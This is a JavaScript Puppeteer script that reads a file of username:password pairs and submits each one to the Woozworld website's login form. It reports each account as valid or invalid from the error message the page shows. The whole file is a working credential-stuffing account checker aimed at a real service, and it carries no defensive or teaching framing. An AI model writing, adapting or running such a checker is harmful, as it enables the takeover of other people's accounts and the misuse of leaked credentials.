"use strict";

// Dependencies
const puppeteer = require("puppeteer")
const fs = require("fs")

// Variables
const args = process.argv.slice(2)

//F unctions
async function main(accounts){
    const browser = await puppeteer.launch({ defaultViewport: null, headless: false, args: ["--no-sandbox", "--disable-setuid-sandbox"] })
    const page = await browser.newPage()

    await page.goto("https://www.woozworld.com/", { waitUntil: "domcontentloaded" })
    
    var accountIndex = 0

    async function checker(){
        if(accounts.length === accountIndex){
            console.log("Finished checking.")
            await browser.close()
            process.exit()
        }

        const account = accounts[accountIndex]

        await page.evaluate(()=>{
            document.querySelector("#forms--login > div:nth-of-type(1) > input[type=text]:nth-of-type(1)").value = ""
            document.querySelector("#forms--login > div:nth-of-type(1) > input[type=password]:nth-of-type(2)").value = ""
        })

        await page.type("#forms--login > div:nth-of-type(1) > input[type=text]:nth-of-type(1)", account.split(":")[0])
        await page.type("#forms--login > div:nth-of-type(1) > input[type=password]:nth-of-type(2)", account.split(":")[1])
        await page.click("#forms--login > div:nth-of-type(1) > input.sign-in-button")

        await page.evaluate(()=>{
            const SI = setInterval(function(){
                const waitfor = document.getElementsByClassName("messg messg-error")

                if(waitfor){
                    clearInterval(SI)

                    waitfor
                }
            }, 1000)
        })

        await page.waitForTimeout(1000)
        const pageContent = await page.content()

       pageContent.match("Incorrect email and/or password.") ? console.log(`Invalid account ${account}`) : console.log(`Valid account ${account}`)

        accountIndex++
        checker()
    }

    checker()
}

// Main
if(!args.length) return console.log("node index.js <accountsFile>")

const accounts = fs.readFileSync(args[0], "utf8").split("\n")

if(!accounts) return console.log("File is empty.")

console.log(`${accounts.length} accounts found.`)
main(accounts)